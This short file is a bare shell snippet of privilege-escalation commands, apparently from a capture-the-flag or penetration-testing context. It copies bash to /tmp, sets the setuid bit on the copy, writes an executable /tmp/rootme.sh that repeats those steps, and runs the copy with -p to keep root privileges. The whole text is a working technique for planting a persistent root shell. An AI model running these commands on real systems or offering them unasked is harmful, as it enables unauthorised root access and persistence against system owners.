cp /bin/bash /tmp/shell
chmod +s /tmp/shell
echo -e '#!/bin/bash\ncp /bin/bash /tmp/shell\nchmod +s /tmp/shell' > /tmp/rootme.sh
chmod +x /tmp/rootme.sh
/tmp/shell -p

